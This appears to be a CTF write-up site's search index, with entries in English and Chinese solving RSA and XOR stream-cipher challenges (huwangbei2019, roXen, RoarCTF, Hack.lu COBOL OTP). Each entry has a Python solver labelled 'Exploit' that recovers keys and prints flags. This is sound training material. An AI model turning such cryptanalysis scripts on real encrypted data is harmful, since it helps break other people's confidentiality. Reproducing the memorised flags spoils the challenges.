algorithm:Find a D being an integer larger than sqrt(C) and form the lists b 0,b D,b 2D,\u2026\u2026,b D*D mod N and b u,b u-1,\u2026\u2026,b^u-D we can sort these lists and find a common value b^rD \u2261 b^u-D mod N and the c is rD+s! Exploit #encoding:utf-8 from Crypto.Util.number import bytes_to_long , long_to_bytes from gmpy2 import * # N = pq 2050bit; p 1025 bit; q 1025 bit N = 67962725468240199924103144864951334845750492508509360358636648068909779932072313362607631417524914992411826230276465100489023746209605790020210412575433464887238013738989770872867041592441153421617243161413094177629581581728221687772551567927241071007480087793370382177952900925657974338348428988433092737432689512506966089398873760401212521089061934975582692308605433023613521500237258699626587149952370997420510392932840377408736864097301789914658244266522930092113493152991783027162871212338968297436073316959569822974289536559300512091342692975133379473145882007983357289924135373382264527866381118893476257705939L # g 500bit; is p-1 and q-1 prime factor # p = 2*g*a + 1;p = 2*g*b + 1 g = 3235645591686044532495326878291617484542045511433360748778013933565021819649890342389737893735574764418484922895778834144345295691799766302763199373647L e = 65537 C = 7918937034819399210460701361082120267249016865135589044938397478179178418982216265766430882604707450651405790878761026681351233717846491757101684210544361607883043938000941498442897699091016071609425252346011280078699567193949155766516051130050592046343488075564740812480634431357869210712013396437065989799117830247228129120071415956115563715118301273810713118159274551107354918579047901176471910532333125717712607469726900731370186233984133546278420585661042017307325998441634272568791745798269084955686428143476025911093137683806174746625559312685862694783475952178855060639359433340135424849663386199035593137765L h = ( N - 1 ) / ( g ) u = h / ( g ) v = h % ( g ) def Solve_c (): sqrt_N = iroot ( mpz ( N ), 2 )[ 0 ] C = div ( sqrt_N , pow ( g , 2 )) a = 2 b = powmod ( a , g , N ) for i in range ( 2 , C ): D = ( iroot ( C , 2 )[ 0 ] + 1 ) * i final = powmod ( b , u , N ) for r in range ( D ): print r * D for s in range ( D ): if powmod ( b , r * D + s , N ) == final : print r = , r , s = , s , i = , i #r = 5168 s = 2145 i = 2 return r * D + s c = Solve_c () print c: , c # c = 51589121 A = u - c # x * y = u - c B = v + c * g # x + y = v + c*g delta = iroot (( B * B - 4 * A ), 2 )[ 0 ] x = ( B + delta ) / 2 y = ( B - delta ) / 2 a = x / 2 b = y / 2 p = 2 * g * a + 1 q = 2 * g * b + 1 d = invert ( e ,( p - 1 ) * ( q - 1 )) m = powmod ( C , d , N ) print long_to_bytes ( m ) #flag{bf82d1cd-67b1-42bd-a7b5-f119f0246dfe}","title":"huwangbei2019_Crypto1"},{"location":"crypto/RSA/huwangbei2019_Crypto1/#huwangbei2019_crypto","text":"Just decrypt it.","title":"huwangbei2019_Crypto"},{"location":"crypto/RSA/huwangbei2019_Crypto1/#examination-site","text":"RSA multiplicative group modulo N","title":"Examination Site"},{"location":"crypto/RSA/huwangbei2019_Crypto1/#analysis","text":"The key code: def gen (): while True : g = getPrime ( 500 ) a = b = 0 while not gmpy2 . is_prime ( 2 * g * a + 1 ): a = random . randint ( 2 ** 523 , 2 ** 524 ) while not gmpy2 . is_prime ( 2 * g * b + 1 ): b = random . randint ( 2 ** 523 , 2 ** 524 ) h = 2 * g * a * b + a + b if gmpy2 . is_prime ( h ): p = 2 * g * a + 1 q = 2 * g * b + 1 return p * q , g We will found that p,q have 1025 bit and have a common factor g which has 500 bit. Howevers,the a,b is unknown and we have to solve them. Reference: Further Attacks On Server-Aided Rsa Cryptosystems According to the article, we can fristly calculate the a*b and (a+b). As we have known N and g,we can calculate the u and v: h = ( N - 1 ) / ( g ) u = h / ( g ) # 4 * xy v = h % ( g ) # 2 * (x+y) And now we have x + y = v + c*g and xy = u -c where c is the unknown carry in (N-1)/g in base g. Since The range of possible values for c is given cg 4*(x+y) and x,y N^( )/g,so that there are of the order of C = sqrt(N)/(g*g) values of c to test. The article gives us a algorithm:Find a D being an integer larger than sqrt(C) and form the lists b 0,b D,b 2D,\u2026\u2026,b D*D mod N and b u,b u-1,\u2026\u2026,b^u-D we can sort these lists and find a common value b^rD \u2261 b^u-D mod N and the c is rD+s!","title":"Analysis"},{"location":"crypto/RSA/huwangbei2019_Crypto1/#exploit","text":"#encoding:utf-8 from Crypto.Util.number import bytes_to_long , long_to_bytes from gmpy2 import * # N = pq 2050bit; p 1025 bit; q 1025 bit N = 67962725468240199924103144864951334845750492508509360358636648068909779932072313362607631417524914992411826230276465100489023746209605790020210412575433464887238013738989770872867041592441153421617243161413094177629581581728221687772551567927241071007480087793370382177952900925657974338348428988433092737432689512506966089398873760401212521089061934975582692308605433023613521500237258699626587149952370997420510392932840377408736864097301789914658244266522930092113493152991783027162871212338968297436073316959569822974289536559300512091342692975133379473145882007983357289924135373382264527866381118893476257705939L # g 500bit; is p-1 and q-1 prime factor # p = 2*g*a + 1;p = 2*g*b + 1 g = 3235645591686044532495326878291617484542045511433360748778013933565021819649890342389737893735574764418484922895778834144345295691799766302763199373647L e = 65537 C = 7918937034819399210460701361082120267249016865135589044938397478179178418982216265766430882604707450651405790878761026681351233717846491757101684210544361607883043938000941498442897699091016071609425252346011280078699567193949155766516051130050592046343488075564740812480634431357869210712013396437065989799117830247228129120071415956115563715118301273810713118159274551107354918579047901176471910532333125717712607469726900731370186233984133546278420585661042017307325998441634272568791745798269084955686428143476025911093137683806174746625559312685862694783475952178855060639359433340135424849663386199035593137765L h = ( N - 1 ) / ( g ) u = h / ( g ) v = h % ( g ) def Solve_c (): sqrt_N = iroot ( mpz ( N ), 2 )[ 0 ] C = div ( sqrt_N , pow ( g , 2 )) a = 2 b = powmod ( a , g , N ) for i in range ( 2 , C ): D = ( iroot ( C , 2 )[ 0 ] + 1 ) * i final = powmod ( b , u , N ) for r in range ( D ): print r * D for s in range ( D ): if powmod ( b , r * D + s , N ) == final : print r = , r , s = , s , i = , i #r = 5168 s = 2145 i = 2 return r * D + s c = Solve_c () print c: , c # c = 51589121 A = u - c # x * y = u - c B = v + c * g # x + y = v + c*g delta = iroot (( B * B - 4 * A ), 2 )[ 0 ] x = ( B + delta ) / 2 y = ( B - delta ) / 2 a = x / 2 b = y / 2 p = 2 * g * a + 1 q = 2 * g * b + 1 d = invert ( e ,( p - 1 ) * ( q - 1 )) m = powmod ( C , d , N ) print long_to_bytes ( m ) #flag{bf82d1cd-67b1-42bd-a7b5-f119f0246dfe}","title":"Exploit"},{"location":"crypto/RSA/roXen/","text":"roXen \u9898\u76ee\u5982\u4e0b\uff1a from Crypto.Util.number import * from secret import exp , flag , nbit assert exp ( exp + 1 ) == 0 def adlit ( x ): l = len ( bin ( x )[ 2 :]) return ( 2 ** l - 1 ) ^ x def genadlit ( nbit ): while True : p = getPrime ( nbit ) q = adlit ( p ) + 31337 if isPrime ( q ): return p , q p , q = genadlit ( nbit ) e , n = exp , p * q c = pow ( bytes_to_long ( flag ), e , n ) print n = , hex ( n ) print c = , hex ( c ) n = 0x3ff77ad8783e006b6a2c9857f2f13a9d896297558e7c986c491e30c1a920512a0bad9f07c5569cf998fc35a3071de9d8b0f5ada4f8767b828e35044abce5dcf88f80d1c0a0b682605cce776a184e1bcb8118790fff92dc519d24f998a9c04faf43c434bef6c0fa39a3db7452dc07ccfced9271799f37d91d56b5f21c51651d6a9a41ee5a8af17a2f945fac2b1a0ea98bc70ef0f3e37371c9c7b6f90d3d811212fc80e0abcd5bbefe0c6edb3ca6845ded90677ccd8ff4de2c747b37265fc1250ba9aa89b4fd2bdfb4b4b72a7ff5b5ee67e81fd25027b6cb49db610ec60a05016e125ce0848f2c32bff33eed415a6d227262b338b0d1f3803d83977341c0d3638fL c = 0x2672cade2272f3024fd2d1984ea1b8e54809977e7a8c70a07e2560f39e6fcce0e292426e28df51492dec67d000d640f3e5b4c6c447845e70d1432a3c816a33da6a276b0baabd0111279c9f267a90333625425b1d73f1cdc254ded2ad54955914824fc99e65b3dea3e365cfb1dce6e025986b2485b6c13ca0ee73c2433cf0ca0265afe42cbf647b5c721a6e51514220bab8fcb9cff570a6922bceb12e9d61115357afe1705bda3c3f0b647ba37711c560b75841135198cc076d0a52c74f9802760c1f881887cc3e50b7e0ff36f0d9fa1bfc66dff717f032c066b555e315cb07e3df13774eaa70b18ea1bb3ea0fd1227d4bac84be2660552d3885c79815baef661L \u5206\u6790\uff1a \u5bf9\u4e8e $$ r=2^l-1 $$ $$ bin(2 l)=100...00,\u6545bin(2 l-1)=0111...11,xorp\u5219\u5c06p\u4e2d\u76841\u5904\u53d8\u4e3a0,0\u53d8\u4e3a1 $$ \u56e0\u6b64 $$ p+adlit(p)=2^l-1 $$ \u6545 $$ p+q=2^l+31336 $$ \u53c8\u7531\u4e8e $$ phi=(p-1)(q-1)=n+1-(p+q)=n-2^l-31335 $$ \u6839\u636en\u4e3a2046bit\uff0c\u56e0\u6b64\u731c\u6d4bp\u4e3a1024bit\uff0cq\u4e3a1022bit\uff0c\u6545 l=1024 \u63a8\u51fa phi = 8075050082948443349212340895390914595911667800472259304754411169066015177591933999426560842475863558771524178567197246061634705069273801684590339376649250275207876158732481939003115606742710400986721591279999826858150876137968993463656776832026731671417714759299940616065017786507499266738676453484280827236471905007897632221975348632278251045611984449962700114930252797604739054532124376815862307463077788325020496718875218389610118666406158621953023266468407185280651586416979516647636599642220645492470810795894389242387553997198008284230298061886510125108409348391328833263239270165044948668605098432639974697256 \u7136\u540e\u5c31\u662fe\u7684\u503c\u4e0d\u786e\u5b9a\uff0c\u6ca1\u6709\u5176\u4ed6\u7684\u601d\u8def\u9009\u62e9\u7206\u7834 \u56e0\u4e3aexp (exp + 1) == 0\uff0c\u6545 $$ exp=2^k-1 $$ \u89e3\u5bc6\u811a\u672c\u5982\u4e0b\uff1a import libnum from Crypto.Util.number import long_to_bytes import gmpy2 phi = 8075050082948443349212340895390914595911667800472259304754411169066015177591933999426560842475863558771524178567197246061634705069273801684590339376649250275207876158732481939003115606742710400986721591279999826858150876137968993463656776832026731671417714759299940616065017786507499266738676453484280827236471905007897632221975348632278251045611984449962700114930252797604739054532124376815862307463077788325020496718875218389610118666406158621953023266468407185280651586416979516647636599642220645492470810795894389242387553997198008284230298061886510125108409348391328833263239270165044948668605098432639974697256 c = 0x2672cade2272f3024fd2d1984ea1b8e54809977e7a8c70a07e2560f39e6fcce0e292426e28df51492dec67d000d640f3e5b4c6c447845e70d1432a3c816a33da6a276b0baabd0111279c9f267a90333625425b1d73f1cdc254ded2ad54955914824fc99e65b3dea3e365cfb1dce6e025986b2485b6c13ca0ee73c2433cf0ca0265afe42cbf647b5c721a6e51514220bab8fcb9cff570a6922bceb12e9d61115357afe1705bda3c3f0b647ba37711c560b75841135198cc076d0a52c74f9802760c1f881887cc3e50b7e0ff36f0d9fa1bfc66dff717f032c066b555e315cb07e3df13774eaa70b18ea1bb3ea0fd1227d4bac84be2660552d3885c79815baef661 n = 0x3ff77ad8783e006b6a2c9857f2f13a9d896297558e7c986c491e30c1a920512a0bad9f07c5569cf998fc35a3071de9d8b0f5ada4f8767b828e35044abce5dcf88f80d1c0a0b682605cce776a184e1bcb8118790fff92dc519d24f998a9c04faf43c434bef6c0fa39a3db7452dc07ccfced9271799f37d91d56b5f21c51651d6a9a41ee5a8af17a2f945fac2b1a0ea98bc70ef0f3e37371c9c7b6f90d3d811212fc80e0abcd5bbefe0c6edb3ca6845ded90677ccd8ff4de2c747b37265fc1250ba9aa89b4fd2bdfb4b4b72a7ff5b5ee67e81fd25027b6cb49db610ec60a05016e125ce0848f2c32bff33eed415a6d227262b338b0d1f3803d83977341c0d3638f k = 1 while True : k += 1 e = 2 ** k - 1 gcd = gmpy2 . gcd ( e , phi ) e2 = e // gcd d = gmpy2 . invert ( e2 , phi // gcd ) m = pow ( c , d , n ) p , judge = gmpy2 . iroot ( m , gcd ) plaintext = long_to_bytes ( p ) if CTF in plaintext and judge : print plaintext break #CCTF{it5_3a5y_l1k3_5uNd4y_MOrn1N9}","title":"roXen"},{"location":"crypto/RSA/roXen/#roxen","text":"\u9898\u76ee\u5982\u4e0b\uff1a from Crypto.Util.number import * from secret import exp , flag , nbit assert exp ( exp + 1 ) == 0 def adlit ( x ): l = len ( bin ( x )[ 2 :]) return ( 2 ** l - 1 ) ^ x def genadlit ( nbit ): while True : p = getPrime ( nbit ) q = adlit ( p ) + 31337 if isPrime ( q ): return p , q p , q = genadlit ( nbit ) e , n = exp , p * q c = pow ( bytes_to_long ( flag ), e , n ) print n = , hex ( n ) print c = , hex ( c ) n = 0x3ff77ad8783e006b6a2c9857f2f13a9d896297558e7c986c491e30c1a920512a0bad9f07c5569cf998fc35a3071de9d8b0f5ada4f8767b828e35044abce5dcf88f80d1c0a0b682605cce776a184e1bcb8118790fff92dc519d24f998a9c04faf43c434bef6c0fa39a3db7452dc07ccfced9271799f37d91d56b5f21c51651d6a9a41ee5a8af17a2f945fac2b1a0ea98bc70ef0f3e37371c9c7b6f90d3d811212fc80e0abcd5bbefe0c6edb3ca6845ded90677ccd8ff4de2c747b37265fc1250ba9aa89b4fd2bdfb4b4b72a7ff5b5ee67e81fd25027b6cb49db610ec60a05016e125ce0848f2c32bff33eed415a6d227262b338b0d1f3803d83977341c0d3638fL c = 0x2672cade2272f3024fd2d1984ea1b8e54809977e7a8c70a07e2560f39e6fcce0e292426e28df51492dec67d000d640f3e5b4c6c447845e70d1432a3c816a33da6a276b0baabd0111279c9f267a90333625425b1d73f1cdc254ded2ad54955914824fc99e65b3dea3e365cfb1dce6e025986b2485b6c13ca0ee73c2433cf0ca0265afe42cbf647b5c721a6e51514220bab8fcb9cff570a6922bceb12e9d61115357afe1705bda3c3f0b647ba37711c560b75841135198cc076d0a52c74f9802760c1f881887cc3e50b7e0ff36f0d9fa1bfc66dff717f032c066b555e315cb07e3df13774eaa70b18ea1bb3ea0fd1227d4bac84be2660552d3885c79815baef661L","title":"roXen"},{"location":"crypto/RSA/roXen/#_1","text":"\u5bf9\u4e8e $$ r=2^l-1 $$ $$ bin(2 l)=100...00,\u6545bin(2 l-1)=0111...11,xorp\u5219\u5c06p\u4e2d\u76841\u5904\u53d8\u4e3a0,0\u53d8\u4e3a1 $$ \u56e0\u6b64 $$ p+adlit(p)=2^l-1 $$ \u6545 $$ p+q=2^l+31336 $$ \u53c8\u7531\u4e8e $$ phi=(p-1)(q-1)=n+1-(p+q)=n-2^l-31335 $$ \u6839\u636en\u4e3a2046bit\uff0c\u56e0\u6b64\u731c\u6d4bp\u4e3a1024bit\uff0cq\u4e3a1022bit\uff0c\u6545 l=1024 \u63a8\u51fa phi = 8075050082948443349212340895390914595911667800472259304754411169066015177591933999426560842475863558771524178567197246061634705069273801684590339376649250275207876158732481939003115606742710400986721591279999826858150876137968993463656776832026731671417714759299940616065017786507499266738676453484280827236471905007897632221975348632278251045611984449962700114930252797604739054532124376815862307463077788325020496718875218389610118666406158621953023266468407185280651586416979516647636599642220645492470810795894389242387553997198008284230298061886510125108409348391328833263239270165044948668605098432639974697256 \u7136\u540e\u5c31\u662fe\u7684\u503c\u4e0d\u786e\u5b9a\uff0c\u6ca1\u6709\u5176\u4ed6\u7684\u601d\u8def\u9009\u62e9\u7206\u7834 \u56e0\u4e3aexp (exp + 1) == 0\uff0c\u6545 $$ exp=2^k-1 $$ \u89e3\u5bc6\u811a\u672c\u5982\u4e0b\uff1a import libnum from Crypto.Util.number import long_to_bytes import gmpy2 phi = 8075050082948443349212340895390914595911667800472259304754411169066015177591933999426560842475863558771524178567197246061634705069273801684590339376649250275207876158732481939003115606742710400986721591279999826858150876137968993463656776832026731671417714759299940616065017786507499266738676453484280827236471905007897632221975348632278251045611984449962700114930252797604739054532124376815862307463077788325020496718875218389610118666406158621953023266468407185280651586416979516647636599642220645492470810795894389242387553997198008284230298061886510125108409348391328833263239270165044948668605098432639974697256 c = 0x2672cade2272f3024fd2d1984ea1b8e54809977e7a8c70a07e2560f39e6fcce0e292426e28df51492dec67d000d640f3e5b4c6c447845e70d1432a3c816a33da6a276b0baabd0111279c9f267a90333625425b1d73f1cdc254ded2ad54955914824fc99e65b3dea3e365cfb1dce6e025986b2485b6c13ca0ee73c2433cf0ca0265afe42cbf647b5c721a6e51514220bab8fcb9cff570a6922bceb12e9d61115357afe1705bda3c3f0b647ba37711c560b75841135198cc076d0a52c74f9802760c1f881887cc3e50b7e0ff36f0d9fa1bfc66dff717f032c066b555e315cb07e3df13774eaa70b18ea1bb3ea0fd1227d4bac84be2660552d3885c79815baef661 n = 0x3ff77ad8783e006b6a2c9857f2f13a9d896297558e7c986c491e30c1a920512a0bad9f07c5569cf998fc35a3071de9d8b0f5ada4f8767b828e35044abce5dcf88f80d1c0a0b682605cce776a184e1bcb8118790fff92dc519d24f998a9c04faf43c434bef6c0fa39a3db7452dc07ccfced9271799f37d91d56b5f21c51651d6a9a41ee5a8af17a2f945fac2b1a0ea98bc70ef0f3e37371c9c7b6f90d3d811212fc80e0abcd5bbefe0c6edb3ca6845ded90677ccd8ff4de2c747b37265fc1250ba9aa89b4fd2bdfb4b4b72a7ff5b5ee67e81fd25027b6cb49db610ec60a05016e125ce0848f2c32bff33eed415a6d227262b338b0d1f3803d83977341c0d3638f k = 1 while True : k += 1 e = 2 ** k - 1 gcd = gmpy2 . gcd ( e , phi ) e2 = e // gcd d = gmpy2 . invert ( e2 , phi // gcd ) m = pow ( c , d , n ) p , judge = gmpy2 . iroot ( m , gcd ) plaintext = long_to_bytes ( p ) if CTF in plaintext and judge : print plaintext break #CCTF{it5_3a5y_l1k3_5uNd4y_MOrn1N9}","title":"\u5206\u6790\uff1a"},{"location":"crypto/RSA/roarctf_rsa/","text":"Roar CTF \u9898\u76ee\uff1a\u89c1attachment \u5206\u6790\uff1a \u601d\u8def1\uff1a \u7b2c\u4e00\u6b65\uff1aA=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x A\u4e3a2015bit\u7684\u4e00\u4e2a\u5927\u6570\uff0c\u6839\u636ey^316\u53ef\u77e5y\u80af\u5b9a\u4e0d\u4f1a\u592a\u5927\uff0c(y+1 )/x\u4e00\u5b9a\u4e3a\u4e00\u4e2a\u6574\u6570\uff0c(((y%x)**5)%(x%y))**2019\u53ef\u80fd\u4e3a1\uff0c\u4e0d\u96be\u7b97\u51fa x=2\uff0cy=83 \u7b2c\u4e8c\u6b65\uff1ap=next_prime(166*z)=166*z+a,q=next_prime(z)=z+b\u3002a,b\u7684\u503c\u5e94\u8be5\u4e0d\u4f1a\u592a\u5927\uff0c\u6545n=p*q=166z^2+(166b+a)z+a*b\uff0c \u56e0\u800c166z^2+(166b+a)z+(a*b-n)=0\u6709\u6574\u6570\u89e3 (166b+a)^2+4*166(n-a*b)\u56e0\u6b64\u662f\u4e00\u4e2a\u5e73\u65b9\u6570\uff0c\u7a77\u4e3e\u904d\u5386a\uff0cb\u503c\u5373\u53ef\uff0c\u6700\u540e\u53ef\u77e5p=842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 q=139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 \u7531\u4e8e\u4e0d\u77e5\u9053e\u503c\uff0c\u731c\u6d4be=65537\u6210\u529f\u6c42\u89e3 \u601d\u8def\u4e8c\uff1a \u5df2\u77e5\u4e86x=2\uff0cy=83\u540e\uff0c\u7531\u4e8en=p*q=166z^2+(166b+a)z+a*b\uff0cz=sqrt(n/166)\uff0c\u53ef\u4ee5\u731c\u6d4b\u51faz\u7684\u9ad8\u6bd4\u7279\u4f4d\u7684\u503c\uff0c\u501f\u6b64\u9884\u6d4b\u51fap\uff0cq\u7684\u90e8\u5206\u6bd4\u7279\u4f4d\u503c\u540e\u7528coppersmith\u5b9a\u7406\u6062\u590d\u51fap\uff0cq\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u9053\u9898\u53d1\u73b0\u76f4\u63a5\u8c03\u7528sympy.nextprime(z)\u5c31\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u4e86p\uff0cq\u7684\u503c\u3002 flag\u503c RoarCTF{wm-l1l1ll1l1l1l111ll}","title":"roarctf_rsa"},{"location":"crypto/RSA/roarctf_rsa/#roar-ctf","text":"","title":"Roar CTF"},{"location":"crypto/RSA/roarctf_rsa/#attachment","text":"","title":"\u9898\u76ee\uff1a\u89c1attachment"},{"location":"crypto/RSA/roarctf_rsa/#_2","text":"\u601d\u8def1\uff1a \u7b2c\u4e00\u6b65\uff1aA=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x","title":"\u5206\u6790\uff1a"},{"location":"crypto/RSA/roarctf_rsa/#flag","text":"RoarCTF{wm-l1l1ll1l1l1l111ll}","title":"flag\u503c"},{"location":"crypto/Stream_Cipher/Hacklu2019_COBOL_OTP/","text":"Hacklu2019-COBOL OTP(CallMeCro) To save the future you have to look at the past. Someone from the inside sent you an access code to a bank account with a lot of money. Can you handle the past and decrypt the code to save the future? Examination Site COBOL Stream Cipher Analysis Convert COBOL to python. Probably meaning as follows with open ( key.txt , r ) as key_file: ws_key = key_file.read () # len(ws_key) = 50 ws_flag = ws_input = str ( raw_input ( Enter your message to encrypt: ))[ :50 ] for i in range ( 50 ) : ws_parse = ord ( ws_input [ i ]) ws_flag += chr ( ord ( ws_key [ i ]) ^ord ( ws_input [ i ])) print ws_flag Obviously,we need to blast the key and restore the plaintext. However,if we blast the key, the blasting range is 255^50 which is a terrible number. Therefore,we have to do something to reduce the range. By observing,we will find a rule:the position of the character whose ascii value is greater than 127 is 0 1 3 10 11 13 20 21 23 30 31 33 40 41 43 = index % 10 == 0 | 1 | 3. This rule shows that the key may only have 10 digits. In addition,we found that there is a rule in ciphertext: No.12 byte == No.22 byte No.24 byte == No.34 byte No.26 byte == No.36 byte No.8 byte == No.18 byte == No.28 byte Therefore,we will guess that the msg is the flag whose beginning may be \"flag{\". According to this guess, we can get the first 5 digits of the key, as well as some of the plaintext. flag { ?????c4n_?????O2_c3?????_s4v?????fUtUr????? It is easy to find this is the flag with some letters of some words. Therefore, We blast the key one by one, and we can judge it correctly according to the part of speech, and finally get the answer. Exploit #encoding:utf-8 from string import printable characters = for i in range ( 33 ,126 ) : characters += chr ( i ) def filter ( source_str, index ) : length = len ( source_str ) / 10 + 1 for i in range ( length ) : if ( source_str [ index + 10 ]) not in characters: return False return True def pwn () : with open ( out , rb ) as ws_enc: ws_enc.readline () enc = ws_enc.readline () #################### No.6 Byte #################### key = guess = flag{ for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ???? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,5 ) : print result #flag{N/[WJ_c4n_bjUW|O2_c3rk_W\u0019_s4v3_kD;`fUtUrE.\\nu5 #################### No.6 Byte #################### #################### No.7 Byte #################### key = guess = flag{N for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ??? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,6 ) : print result #flag{N0[WJ_c4n_buUW|O2_c3rt_W\u0019_s4v3_tD;`fUtUrE1\\nu5 #################### No.7 Byte #################### #################### No.8 Byte #################### key = guess = flag{N0 for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ?? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,7 ) : print result #flag{N0wWJ_c4n_buyW|O2_c3rtsW\u0019_s4v3_th;`fUtUrE1!u5 #################### No.8 Byte #################### #################### No.9 Byte #################### key = guess = flag{N0w for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,8 ) : print result #flag{N0w_J_c4n_buy_|O2_c3rts_\u0019_s4v3_th3`fUtUrE1!}5 #################### No.9 Byte #################### #################### No.10 Byte #################### key = guess = flag{Now_ for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,9 ) : print result #flag{Now_u_c4n_b*y_CO2_c3r+s_ _s4v3_+h3_fUtUrEn!} #################### No.10 Byte #################### if __name__ == __main__ : pwn ()","title":"Hacklu2019_COBOL_OTP"},{"location":"crypto/Stream_Cipher/Hacklu2019_COBOL_OTP/#hacklu2019-cobol-otpcallmecro","text":"To save the future you have to look at the past. Someone from the inside sent you an access code to a bank account with a lot of money. Can you handle the past and decrypt the code to save the future?","title":"Hacklu2019-COBOL OTP(CallMeCro)"},{"location":"crypto/Stream_Cipher/Hacklu2019_COBOL_OTP/#examination-site","text":"COBOL Stream Cipher","title":"Examination Site"},{"location":"crypto/Stream_Cipher/Hacklu2019_COBOL_OTP/#analysis","text":"Convert COBOL to python. Probably meaning as follows with open ( key.txt , r ) as key_file: ws_key = key_file.read () # len(ws_key) = 50 ws_flag = ws_input = str ( raw_input ( Enter your message to encrypt: ))[ :50 ] for i in range ( 50 ) : ws_parse = ord ( ws_input [ i ]) ws_flag += chr ( ord ( ws_key [ i ]) ^ord ( ws_input [ i ])) print ws_flag Obviously,we need to blast the key and restore the plaintext. However,if we blast the key, the blasting range is 255^50 which is a terrible number. Therefore,we have to do something to reduce the range. By observing,we will find a rule:the position of the character whose ascii value is greater than 127 is 0 1 3 10 11 13 20 21 23 30 31 33 40 41 43 = index % 10 == 0 | 1 | 3. This rule shows that the key may only have 10 digits. In addition,we found that there is a rule in ciphertext: No.12 byte == No.22 byte No.24 byte == No.34 byte No.26 byte == No.36 byte No.8 byte == No.18 byte == No.28 byte Therefore,we will guess that the msg is the flag whose beginning may be \"flag{\". According to this guess, we can get the first 5 digits of the key, as well as some of the plaintext. flag { ?????c4n_?????O2_c3?????_s4v?????fUtUr????? It is easy to find this is the flag with some letters of some words. Therefore, We blast the key one by one, and we can judge it correctly according to the part of speech, and finally get the answer.","title":"Analysis"},{"location":"crypto/Stream_Cipher/Hacklu2019_COBOL_OTP/#exploit","text":"#encoding:utf-8 from string import printable characters = for i in range ( 33 ,126 ) : characters += chr ( i ) def filter ( source_str, index ) : length = len ( source_str ) / 10 + 1 for i in range ( length ) : if ( source_str [ index + 10 ]) not in characters: return False return True def pwn () : with open ( out , rb ) as ws_enc: ws_enc.readline () enc = ws_enc.readline () #################### No.6 Byte #################### key = guess = flag{ for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ???? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,5 ) : print result #flag{N/[WJ_c4n_bjUW|O2_c3rk_W\u0019_s4v3_kD;`fUtUrE.\\nu5 #################### No.6 Byte #################### #################### No.7 Byte #################### key = guess = flag{N for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ??? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,6 ) : print result #flag{N0[WJ_c4n_buUW|O2_c3rt_W\u0019_s4v3_tD;`fUtUrE1\\nu5 #################### No.7 Byte #################### #################### No.8 Byte #################### key = guess = flag{N0 for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ?? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,7 ) : print result #flag{N0wWJ_c4n_buyW|O2_c3rtsW\u0019_s4v3_th;`fUtUrE1!u5 #################### No.8 Byte #################### #################### No.9 Byte #################### key = guess = flag{N0w for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) + ? result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,8 ) : print result #flag{N0w_J_c4n_buy_|O2_c3rts_\u0019_s4v3_th3`fUtUrE1!}5 #################### No.9 Byte #################### #################### No.10 Byte #################### key = guess = flag{Now_ for i in range ( len ( guess )) : key += chr ( ord ( guess [ i ]) ^ord ( enc [ i ])) for i in range ( 255 ) : ws_key = key + chr ( i ) result = for j in range ( len ( enc )) : result += chr ( ord ( ws_key [ j%10 ]) ^ord ( enc [ j ])) if filter ( result,9 ) : print result #flag{Now_u_c4n_b*y_CO2_c3r+s_ _s4v3_+h3_fUtUrEn!} #################### No.10 Byte #################### if __name__ == __main__ : pwn ()","title":"Exploit"},{"location":"misc/","text":"waiting","title":"home"},{"location":"misc/#waiting","text":"","title":"waiting"},{"location":"misc/LSB/Redhat2019_Advertising_for_Marriage/","text":"Advertise For Marriage someone want a girlfriend..... \u8003\u70b9 LSB \u9690\u5199 \u5185\u5b58\u53d6\u8bc1 \u56fe\u7247\u4fee\u590d \u505a\u9898\u8fc7\u7a0b \u9996\u5148\uff0c\u5148\u67e5\u770b\u955c\u50cf\u4fe1\u606f volatility -f Advertising \\ for \\ Marriage.raw imageinfo 